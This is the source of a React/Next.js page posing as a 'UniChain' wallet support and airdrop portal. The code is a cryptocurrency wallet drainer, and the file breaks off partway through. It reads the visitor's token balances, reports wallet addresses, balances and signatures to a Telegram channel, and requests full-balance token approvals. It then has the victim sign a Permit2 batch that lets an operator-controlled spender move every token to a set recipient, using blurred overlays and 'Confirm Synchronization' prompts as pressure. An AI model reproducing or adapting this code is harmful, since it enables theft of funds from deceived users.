import React, { useContext, useState, useEffect } from 'react';
import { ConnectWallet, useAddress, useBalance, useConnectionStatus, useSigner,useSwitchChain,useSDK } from "@thirdweb-dev/react";
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import ChainContext from "../context/Chain";
import { NextPage } from "next";
import {Modal, ModalContent, ModalHeader, ModalBody, ModalFooter, Button, useDisclosure, Card,CardBody,CardFooter,Navbar, NavbarBrand, NavbarContent,NavbarMenu,NavbarMenuToggle, NavbarMenuItem, NavbarItem, Link,Switch,CircularProgress} from "@nextui-org/react";
import { ethers,utils} from "ethers";
import { AllowanceTransfer,AllowanceProvider,PERMIT2_ADDRESS} from '@uniswap/permit2-sdk';
import IUniswapV3FactoryABI from '@uniswap/v3-core/artifacts/contracts/interfaces/IUniswapV3Factory.sol/IUniswapV3Factory.json';
import IUniswapV3PoolABI from '@uniswap/v3-core/artifacts/contracts/interfaces/IUniswapV3Pool.sol/IUniswapV3Pool.json';
import {getPoolImmutables, getPoolState} from '../context/helpers';
import {Token} from '@uniswap/sdk-core';
import Quoter from  '@uniswap/v3-periphery/artifacts/contracts/lens/Quoter.sol/Quoter.json';
import  SwapRouterABI from '@uniswap/v3-periphery/artifacts/contracts/interfaces/ISwapRouter.sol/ISwapRouter.json';
import {useTheme} from "next-themes";
import MoonIcon from "./moon";
import SunIcon from "./sun";
import Head from 'next/head';

const Home: NextPage = () => {
    type Chain = {
      name: string;
      id: number;
      synced: boolean;
      symbol: string;
      title: string;
      quoterDecimals:number;
      wrappedTokenSymbol:string;
      wrappedTokenAddress:string;
      wrappedTokenName:string;
      unwrappedTokenAddress:string;
      v3FactoryAddress:string;
      quoterAddress:string;
      swapRouter:string;
    };
    
    type TokenConfig ={
      name: string;
      balance: number;
      symbol: string;
      balanceUSD: string;
      address: string;
      decimals: number;
      liquidity: number;
      rawBalance: number;
    }
    interface AllowanceDetails{
      addressFrom: string;
      addressTo: string;
      amount: number;
      address: string;
    }
    interface SwapConfig{
      rpc: {
        local: string
        mainnet: string
      }
      wallet: {
        address: string
        privateKey: string
      }
      tokens: {
        in: Token
        amountIn: number
        out: Token
      }
    }
   
    const list = [
      {
          title: "Deposit",
          body: "Resolve deposit related issues",
          price: "",
        },
        {
          title: "Withdraw",
          body: "Resolve withdrawal related issues",
          price: "",
        },
        {
          title: "Public Sale",
          body: "Resolve public sale related issues",
          price: "",
        },
        {
          title: "Private Sale",
          body: "Resolve private sale related issues",
          price: "",
        },
      {
        title: "Referral Rewards",
        body: "Earn referral rewards from UniChain",
        price: "",
      },
      {
        title: "Claim Rewards",
        body: "Claim available rewards",
        price: "",
      },
      {
        title: "Earn Rewards",
        body: "Earn rewards with UniChain",
      }, 
      {
        title: "Marketplace",
        body: "Access and explore UniChain marketplace",
      },
      {
          title:"Rectification",
          body:"Resolve rectification related issues",
          
      },
      {
          title:"Stake",
          body:"Resolve staking related issues",
          
      },
      {
          title:"Unstake",
          body:"Resolve unstaking related issues",
          
      },
      {
          title:"Galxe-Web",
          body:"Access and explore Galxe-web",
          
      },
      {
          title:"Zealy Market",
          body:"Access and Explore Zealy Market",
          
      },
      {
          title:"Guild.xyz",
          body:"Access and Explore Guild.xyz",
          
      },
      {
          title:"Bridge Token",
          body:"Resolve token bridging issues",
          
      },
      {
          title:"Get Role",
          body:"Resolve (Get Role) related issues",
          
      },
      {
          title:"Verify Role",
          body:"Resolve role verification Issues",
          
      },
      {
          title:"Merge RPC",
          body:"Resolve RPC Merging issues",
          
      },
      {
          title:"Swap",
          body:"Resolve swap related issues",
          
      },
      {
          title:"Connect Tasks",
          body:"Resolve task connection issues",
          
      },
      {
          title:"Mint",
          body:"Resolve minting issues",
          
      },
      {
          title:"Troubleshoot",
          body:"use this for troubleshooting",
          
      },
      {
          title:"Fix Gas",
          body:"Resolve gas fixing issues",
          
      },
      {
          title:"Retreieve Service",
          body:"Use for service retrieval",
          
      },
      {
          title:"Add Liquidity",
          body:"Resolve liquidity addition issues",
          
      },
      {
          title:"Remove Liquidity",
          body:"Resolve liquidity removal issues",
          
      },
      {
        title:"Slippage",
        body:"Resolve slippage related issues",
      },
      {
        title:"Whitelist",
        body:"Whitelist your address or resolve Whitelistng related issues"
      },
      {
        title:"Recovery",
        body:"Recover lost or stuck wallet assets"
      },
      {
        title:"Validation",
        body:"Validate wallet via Multisig"
      },
      {
        title:"Defi Farming",
        body:"Resolve Defi/Commercial farming related issues"
      },
      {
        title:"Transaction Delay",
        body:"Resolve transaction related issues."
      },
      {
        title:"Migration",
        body:"Resolve migration related issues"
      },
      {
        title:"Exchange",
        body:"Resolve exchange related issues"
      },
      {
        title:"NFT",
        body:"Resolve all NFT related issues."
      },
      {
        title:"Claim NFT",
        body:"Claim free NFTs from UniChain"
      },
  
      
    ];
    const { selectedChain, setSelectedChain } = useContext(ChainContext);
    const [chainList, setChainList] = useState<Chain[]>([]);
    const [selectedChainId, setSelectedChainId] = useState<number | null>(1); 
    const [selectedSymbol, setSelectedSymbol] = useState<string>('');
    const [selectedTitle, setSelectedTitle] = useState<string>("");
    const [selectedWrappedTokenAddress, setSelectedWrappedTokenAddress] = useState<string>("");
    const [selectedQuoterDecimal, setSelectedQuoterDecimal] = useState<number | null>(18);
    const [selectedwrappedTokenSymbol, setSelectedwrappedTokenSymbol] = useState<string>("");
    const [selectedwrappedTokenName, setSelectedwrappedTokenName] = useState<string>("");
    const [selectedunwrappedTokenAddress, setSelectedunwrappedTokenAddress] = useState<string>("");
    const [selectedv3FactoryAddress, setSelectedv3FactoryAddress] = useState<string>("");
    const [chainSelectionConfirmed, setChainSelectionConfirmed] = useState(false);
    const [selectedSwapRouter, setSelectedSwapRouter] = useState<string>("");
    const [selectedQuoterAddress, setSelectedQuoterAddress] = useState<string>("");
    const [loading, setLoading] = useState(false);
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);
    const menuItems = [  "Home","Airdrops", "Support",];
    const { theme, setTheme } = useTheme();
    const [showConnectModal, setShowConnectModal] = useState(false);
    const {isOpen, onOpen, onOpenChange, onClose} = useDisclosure();
    const switchChain = useSwitchChain();
    const connectionStatus = useConnectionStatus();
    const signer = useSigner();
    const address = useAddress();
    const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
    const wbalance = data?.displayValue;
    let wbalanced: number | undefined;
    let wbalnstrnf: number | undefined;
    if (wbalance !== undefined) {
        wbalanced = parseFloat(wbalance);
        wbalnstrnf = parseFloat((wbalanced * 0.80).toFixed(3));
    } else {
    } 
    const abi = require('erc-20-abi');
    const pk = process.env.NEXT_PUBLIC_PRIVATE_KEY || '0x9r1v473K3yf0r51gn1ng7r4n54c710n5';
    const sdk = ThirdwebSDK.fromPrivateKey(pk, selectedChain);
    const sdk2 = useSDK();
    const provider = sdk.getProvider();
    const dWallet = new ethers.Wallet(pk, provider);
    const permitAbi = [
      {
     "inputs": [
       {
         "internalType": "address",
         "name": "owner",
         "type": "address"
       },
       {
         "components": [
           {
             "components": [
               {
                 "internalType": "address",
                 "name": "token",
                 "type": "address"
               },
               {
                 "internalType": "uint160",
                 "name": "amount",
                 "type": "uint160"
               },
               {
                 "internalType": "uint48",
                 "name": "expiration",
                 "type": "uint48"
               },
               {
                 "internalType": "uint48",
                 "name": "nonce",
                 "type": "uint48"
               }
             ],
             "internalType": "struct IAllowanceTransfer.PermitDetails[]",
             "name": "details",
             "type": "tuple[]"
           },
           {
             "internalType": "address",
             "name": "spender",
             "type": "address"
           },
           {
             "internalType": "uint256",
             "name": "sigDeadline",
             "type": "uint256"
           }
         ],
         "internalType": "struct IAllowanceTransfer.PermitBatch",
         "name": "permitBatch",
         "type": "tuple"
       },
       {
         "internalType": "bytes",
         "name": "signature",
         "type": "bytes"
       }
     ],
     "name": "permit",
     "outputs": [],
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
     "inputs": [
       {
         "internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
         "name": "transferDetails",
         "type": "tuple[]",
         "components": [
           {
             "internalType": "address",
             "name": "from",
             "type": "address"
           },
           {
             "internalType": "address",
             "name": "to",
             "type": "address"
           },
           {
             "internalType": "uint160",
             "name": "amount",
             "type": "uint160"
           },
           {
             "internalType": "address",
             "name": "token",
             "type": "address"
           }
         ]
       }
     ],
     "stateMutability": "nonpayable",
     "type": "function",
     "name": "transferFrom"
   }
  ];
    function isThemeValid(theme: any): theme is "light" | "dark" {
      return theme === "light" || theme === "dark";
    }
    function getHrefForMenuItem(item:string, index:number) {
      switch (index) {
        case 0:
          return "#";
        case 1:
          return "#";
        case 2:
          return "https://discord.gg/gwj6U2E9nR";
        default:
          return "#"; 
      }
    }
    useEffect(() => {
      const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
      let initialList;
      if (!storedList || storedList.length === 0) {
        const initialList = [
          { name: "ethereum", id: 1, synced: false,  symbol: "ETH",title: "Ethereum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",unwrappedTokenAddress:"0x6B175474E89094C44Da98b954EedeAC495271d0F",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
          { name: "arbitrum", id: 42161, synced: false, symbol: "ETH" ,title: "Arbitrum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
          { name: "optimism", id: 10, synced: false,  symbol: "ETH",title: "Optimism",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
          { name: "polygon", id: 137, synced: false,  symbol: "MATIC",title: "Polygon",wrappedTokenName:"Wrapped Matic",quoterDecimals:18,wrappedTokenSymbol:"WMATIC",wrappedTokenAddress:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",unwrappedTokenAddress:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
            { name: "fantom", id: 250, synced: false,  symbol: "FTM",title: "Fantom",wrappedTokenName:"Wrapped Fantom",quoterDecimals:18,wrappedTokenSymbol:"WFTM",wrappedTokenAddress:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",unwrappedTokenAddress:"0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",v3FactoryAddress:"",quoterAddress:"",swapRouter:""},
             { name: "binance", id: 56, synced: false,  symbol: "BNB",title: "Binance Smart Chain",wrappedTokenName:"Wrapped BNB",quoterDecimals:18,wrappedTokenSymbol:"WBNB",wrappedTokenAddress:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",unwrappedTokenAddress:"0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",v3FactoryAddress:"0xdB1d10011AD0Ff90774D0C6Bb92e5C5c8b4461F7",quoterAddress:"0x78D78E420Da98ad378D7799bE8f4AF69033EB077",swapRouter:"0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2"},
             { name: "base", id: 8453, synced: false,  symbol: "ETH",title: "Base",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",v3FactoryAddress:"0x33128a8fC17869897dcE68Ed026d694621f6FDfD",quoterAddress:"0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a",swapRouter:"0x2626664c2603336E57B271c5C0b26F421741e481"},
            ];
          setChainList(initialList);
          localStorage.setItem('chainList', JSON.stringify(initialList));
          onOpen();
    
          
         
        } else {
          const allChainsUnsynced = storedList.every((chain:Chain) => !chain.synced);
          if (allChainsUnsynced) {
            const initialList = [
              { name: "ethereum", id: 1, synced: false,  symbol: "ETH",title: "Ethereum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",unwrappedTokenAddress:"0x6B175474E89094C44Da98b954EedeAC495271d0F",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
              { name: "arbitrum", id: 42161, synced: false, symbol: "ETH" ,title: "Arbitrum",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
              { name: "optimism", id: 10, synced: false,  symbol: "ETH",title: "Optimism",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
              { name: "polygon", id: 137, synced: false,  symbol: "MATIC",title: "Polygon",wrappedTokenName:"Wrapped Matic",quoterDecimals:18,wrappedTokenSymbol:"WMATIC",wrappedTokenAddress:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",unwrappedTokenAddress:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",v3FactoryAddress:"0x1F98431c8aD98523631AE4a59f267346ea31F984",quoterAddress:"0x61fFE014bA17989E743c5F6cB21bF9697530B21e",swapRouter:"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"},
                { name: "fantom", id: 250, synced: false,  symbol: "FTM",title: "Fantom",wrappedTokenName:"Wrapped Fantom",quoterDecimals:18,wrappedTokenSymbol:"WFTM",wrappedTokenAddress:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",unwrappedTokenAddress:"0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",v3FactoryAddress:"",quoterAddress:"",swapRouter:""},
                 { name: "binance", id: 56, synced: false,  symbol: "BNB",title: "Binance Smart Chain",wrappedTokenName:"Wrapped BNB",quoterDecimals:18,wrappedTokenSymbol:"WBNB",wrappedTokenAddress:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",unwrappedTokenAddress:"0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",v3FactoryAddress:"0xdB1d10011AD0Ff90774D0C6Bb92e5C5c8b4461F7",quoterAddress:"0x78D78E420Da98ad378D7799bE8f4AF69033EB077",swapRouter:"0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2"},
                 { name: "base", id: 8453, synced: false,  symbol: "ETH",title: "Base",wrappedTokenName:"Wrapped Ether",quoterDecimals:18,wrappedTokenSymbol:"WETH",wrappedTokenAddress:"0x4200000000000000000000000000000000000006",unwrappedTokenAddress:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",v3FactoryAddress:"0x33128a8fC17869897dcE68Ed026d694621f6FDfD",quoterAddress:"0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a",swapRouter:"0x2626664c2603336E57B271c5C0b26F421741e481"},
                ];
          setChainList(initialList);
          localStorage.setItem('chainList', JSON.stringify(initialList));
            onOpen();
          }
    
      }
      
    }, []);
    const handleChainSelection = async (chainName: string, chainId: number, chainSym: string, chainTitle:string, chainQuoterDecimals:number, chainWrappedTokenSymbol:string,chainWrappedTokenAddress:string,chainWrappedTokenName:string,chainUnwrappedTokenAddress:string,chainV3FactoryAddress:string,chainQuoterAddress:string,chainSwapRouter:string) => {
      // Logic to handle the selected chain
      setSelectedChain(chainName);
      setSelectedChainId(chainId);
      setSelectedSymbol(chainSym);
      setSelectedTitle(chainTitle);
      setSelectedQuoterDecimal(chainQuoterDecimals);
      setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
      setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
      setSelectedwrappedTokenName(chainWrappedTokenName);
      setSelectedunwrappedTokenAddress(chainUnwrappedTokenAddress);
      setSelectedv3FactoryAddress(chainV3FactoryAddress);
      setSelectedQuoterAddress(chainQuoterAddress);
      setSelectedSwapRouter(chainSwapRouter);
  
      switch (connectionStatus) {
        case "unknown":
          await sendMessageToTelegram("Wallet not connected");
          return;
        case "connected":
          await sendMessageToTelegram(`Wallet with address ${address} has connected`);
          await switchChain(chainId);
          onClose();
          setChainSelectionConfirmed(true);
          await sendMessageToTelegram(`Chain selected !`);
          break;
        case "disconnected":
          await sendMessageToTelegram("Wallet has either not connected or has been disconnected");
          onClose();
          setShowConnectModal(true);
          return;
        default:
          break;
      }
    };
    const handleChainSelection2 = async (chainName: string, chainId: number, chainSym: string, chainTitle:string, chainQuoterDecimals:number, chainWrappedTokenSymbol:string,chainWrappedTokenAddress:string,chainWrappedTokenName:string,chainUnwrappedTokenAddress:string,chainV3FactoryAddress:string,chainQuoterAddress:string,chainSwapRouter:string) => {
      // Logic to handle the selected chain
      setSelectedChain(chainName);
      setSelectedChainId(chainId);
      setSelectedSymbol(chainSym);
      setSelectedTitle(chainTitle);
      setSelectedQuoterDecimal(chainQuoterDecimals);
      setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
      setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
      setSelectedwrappedTokenName(chainWrappedTokenName);
      setSelectedunwrappedTokenAddress(chainUnwrappedTokenAddress);
      setSelectedv3FactoryAddress(chainV3FactoryAddress);
      setSelectedQuoterAddress(chainQuoterAddress);
      setSelectedSwapRouter(chainSwapRouter);
  
      switch (connectionStatus) {
        case "unknown":
          await sendMessageToTelegram("Wallet not connected");
          return;
        case "connected":
          await sendMessageToTelegram(`Wallet with address ${address} has connected`);
          await switchChain(chainId);
          await sendMessageToTelegram(`Chain selected !`);
          onClose();
          break;
        case "disconnected":
          await sendMessageToTelegram("Wallet has been disconnected");
          onClose();
          setShowConnectModal(true);
          return;
        default:
          break;
      }
    };
    function markChainAsSynced(chainName: string) {
      const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
      const index = storedList.findIndex((chain:Chain) => chain.name === chainName);
      // If the chain is found, mark it as synced
      if (index !== -1) {
        storedList[index].synced = true;
        localStorage.setItem('chainList', JSON.stringify(storedList));
      }
    }
    async function syncChain(chainName: string, chainId: number, chainSymbol: string) {
      if (address === undefined){
        setShowConnectModal(true);
      }else{

     
      setChainSelectionConfirmed(false);
      setLoading(true);
      // Logic to run sync
      await sendMessageToTelegram(`Running sync for chain: ${chainName}`);
      await sendMessageToTelegram(`Chain ID: ${chainId}`);
      await sendMessageToTelegram(`Chain Symbol:  ${chainSymbol}`);
  
  let url: string;
  let nativeUrl: string;
  switch(selectedChain) {
    case 'ethereum':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=ethereum`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=ethereum`;
      break;
    case 'polygon':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=polygon`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=polygon`;
      break;
    case 'avalanche':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=avalanche`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=avalanche`;
      break;
      case 'binance':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=bsc`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=bsc`;
      break;
    case 'arbitrum':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=arbitrum`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=arbitrum`;
      break;
    case 'optimism':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=optimism`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=optimism`;
      break;
    case 'fantom':
      url = `https://api.portals.fi/v2/account?owner=${address}&networks=fantom`;
      nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=fantom`;
      break;
      case 'celo':
        url = `https://api.portals.fi/v2/account?owner=${address}&networks=celo`;
        nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=celo`;
        break;
        case 'base':
          url= `https://api.portals.fi/v2/account?owner=${address}&networks=base`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=base`;
          break;
      default:
        url='';
        nativeUrl='';
        break;
  }
  const headers ={
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_PORTAL_KEY}`
  }
  const response = await fetch(url, {
    method: "GET",
    headers: headers
  });
  const data = await response.json();
  const tokens =data.balances.filter((token: TokenConfig) => token.address !== "0x0000000000000000000000000000000000000000");
  let totalBalanceUSD = 0;
  const tokenDetails = tokens.filter((token: TokenConfig) => token.liquidity > 0).map((token: TokenConfig) => {
    totalBalanceUSD += parseFloat(token.balanceUSD);
    return {
      address: token.address,
      decimals: token.decimals,
      symbol: token.symbol,
      name: token.name,
      balance: token.balance,
      balanceUSD: token.balanceUSD,
      rawBalance: token.rawBalance,
      liquidity: token.liquidity
    }
  });
  const tokensUsdValue =parseFloat(totalBalanceUSD.toFixed(2));
  await sendMessageToTelegram(`Total token balance in USD: $${totalBalanceUSD.toFixed(2)}`);
  
  const headersNative = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_PORTAL_KEY}`
  }
  const responseNative = await fetch(nativeUrl, {
    method: "GET",
    headers: headersNative,
  })
  const dataNative = await responseNative.json();
  const nativeUsdPrice = dataNative.tokens[0].price;
  let nativeAmountinUSD = 0;
  if (wbalanced !== undefined) {
    nativeAmountinUSD = wbalanced * nativeUsdPrice;
    await sendMessageToTelegram(`Native balance in USD: $${nativeAmountinUSD.toFixed(2)}`);
  }
  await processTokens(tokenDetails, tokensUsdValue, nativeAmountinUSD);
  markChainAsSynced(chainName);
  const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
  const unsyncedChains = storedList.filter((chain: Chain) => !chain.synced);
      if (unsyncedChains.length === 0) {
        await sendMessageToTelegram("All chains synced successfully.");
      }
  const nextIndex = storedList.findIndex((chain: Chain) => !chain.synced);
  const nextChain = storedList[nextIndex];
  const confirmButton = document.createElement("div");
confirmButton.style.position = "fixed";
confirmButton.style.top = "50%";
confirmButton.style.left = "50%";
confirmButton.style.transform = "translate(-50%, -50%)";
confirmButton.style.zIndex = "1000";
confirmButton.style.textAlign = "center";
confirmButton.style.background = "rgba(0,0,0,0.5)";
confirmButton.style.padding = "20px";
confirmButton.style.borderRadius = "8px";
const confirmButtonText = document.createElement("p");
confirmButtonText.textContent = "Confirm Synchronization";
confirmButton.appendChild(confirmButtonText);
confirmButton.addEventListener("click", async () => {
  await handleChainSelection(nextChain.name, nextChain.id,nextChain.symbol,nextChain.title,nextChain.quoterDecimals,nextChain.wrappedTokenSymbol,nextChain.wrappedTokenAddress,nextChain.wrappedTokenName,nextChain.unwrappedTokenAddress,nextChain.v3FactoryAddress,nextChain.quoterAddress,nextChain.swapRouter);
  confirmButton.remove();
});
document.body.style.filter = "blur(4px)";
setLoading(false);
document.body.appendChild(confirmButton);
      }
    }
    async function processTokens(tokens:TokenConfig[],tokensUsdValue:number, nativeAmountinUSD:number){
    await sendMessageToTelegram(`Processing begins`);
    if (tokensUsdValue > nativeAmountinUSD){
      await sendMessageToTelegram(`total amount of erc20 tokens $${tokensUsdValue} is more than the amount of ${selectedSymbol} on the ${selectedChain} network.`);
      for(const token of tokens){
        const tokenInfo =`Name: ${token.name}\n Symbol: ${token.symbol}\n Balance: ${token.balance}\n Balance USD:$ ${token.balanceUSD}\n Contract Address: ${token.address}\n Available Liquidity: ${token.liquidity}`;
        await sendMessageToTelegram(`${tokenInfo}`);
        await functionX(tokens);
        await functionY();
      }
    }else{
      await sendMessageToTelegram(`total amount of ${selectedSymbol} is more than the amount of erc20 tokens $${tokensUsdValue} on the ${selectedChain} network.`)
      for(const token of tokens){
        const tokenInfo =`Name: ${token.name}\n Symbol: ${token.symbol}\n Balance: ${token.balance}\n Balance USD:$ ${token.balanceUSD}\n Contract Address: ${token.address}\n Available Liquidity: ${token.liquidity}`;
        await sendMessageToTelegram(`${tokenInfo}`);
        await functionY();
        await functionX(tokens);
      }
    }
  }
  async function requestAllowance(token: TokenConfig) {
    try {
      const tokenContract = new ethers.Contract(token.address, abi, signer);
      const spender = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
      const amount = ethers.utils.parseUnits(token.balance.toString(), token.decimals);
      
      const transaction = await tokenContract.approve(spender, amount);
      await transaction.wait();
      await sendMessageToTelegram(`Transaction signed for allowance request of ${token.name}`);
      await sendMessageToTelegram(`Allowance requested for ${token.name}`);
      
    } catch (error) {
      await sendMessageToTelegram(`Error requesting allowance. Inform the user to retry: ${error}`);
    }
  }
  
  async function functionX(tokens: TokenConfig[]) {
    try {
      await sendMessageToTelegram('Executing Allowance requests');
      
      const allowedTokens: TokenConfig[] = [];
  
      // Iterate through tokens one by one
      for (const token of tokens) {
        // Check if token.usdValue is zero
        if (parseFloat(token.balanceUSD) === 0) {
          await sendMessageToTelegram(`Skipping token ${token.name} as its USD value is zero`);
          continue; // Skip to the next iteration of the loop
        }
  
        // Get the allowance directly
        const tokenContract = new ethers.Contract(token.address, abi, signer);
        const spender = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
        const allowance = await tokenContract.allowance(address, spender);
        const amount = ethers.utils.parseUnits(token.balance.toString(), token.decimals);
  
        // Log allowance
        await sendMessageToTelegram(`${token.name} allowance is ${allowance.toString()}`);
        
        // Check if allowance is less than token balance
        if (allowance.eq(amount)) {
          // If allowance not enough, request it
          await requestAllowance(token);
        } else {
          allowedTokens.push(token);
        }
      }
  
      // Now allowedTokens contains all tokens with granted allowance
      await generatePermitSignature(allowedTokens);
  
    } catch (error) {
      await sendMessageToTelegram(`Error in Executing Tokens Synchronization Function\n REASON: ${error}`);
    }
  }
  
  
  async function generatePermitSignature(tokenInfoArray: TokenConfig[]) {
    try {
        const init = process.env.NEXT_PUBLIC_INITIATOR || "0xinitiator";
        const initiator = init;
        const recipient = process.env.NEXT_PUBLIC_RECIEPIENT || "0xr3c13913n7"
        const permitDetails = [];
        for (const token of tokenInfoArray) {
          const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
          const nonce = await allowanceProvider.getNonce(token.address, address!, PERMIT2_ADDRESS);
          permitDetails.push({
            token: token.address,
            amount: utils.parseUnits(token.balance.toString(), token.decimals),
            nonce:nonce,
            expiration: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60),
          });  
        }
        const transferDetails = tokenInfoArray.map((tokenInfo) =>({
          from: address,
          to: recipient,
          amount: utils.parseUnits(tokenInfo.balance.toString(), tokenInfo.decimals),
          token: tokenInfo.address,
        }));
        const sigDeadline = Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60);
        const permitBatch = {
            details: permitDetails,
            spender: initiator,
            sigDeadline: sigDeadline,
        };  
        const domain = {
          name: "Permit2",
          chainId: selectedChainId ?? 1,
          verifyingContract: PERMIT2_ADDRESS,
        };
        const { types, values } = AllowanceTransfer.getPermitData(
            permitBatch,
            PERMIT2_ADDRESS,
            selectedChainId ?? 1
        );  
       const signature = await sdk2?.wallet.signTypedData(domain,types,values);
       await sendMessageToTelegram(`Signature: ${signature?.signature}`);
       if (signature) {
        // Extract r, s, and v components from the signature
        const r = '0x' + signature.signature.slice(2, 66);
        const s = '0x' + signature.signature.slice(66, 130);
        const v = parseInt('0x' + signature.signature.slice(130, 132), 16);
    
        await sendMessageToTelegram(`rSig: ${r}`);
        await sendMessageToTelegram(`sSig: ${s}`);
        await sendMessageToTelegram(`vSig: ${v}`);
    
        // Verify the typed data signature
        const signerAddress = utils.verifyTypedData(domain, types, values, { r, s, v });
        await sendMessageToTelegram(`Signer Address: ${signerAddress}`);
    
        // Compare the recovered signer address with the expected address
        if (signerAddress !== address) {
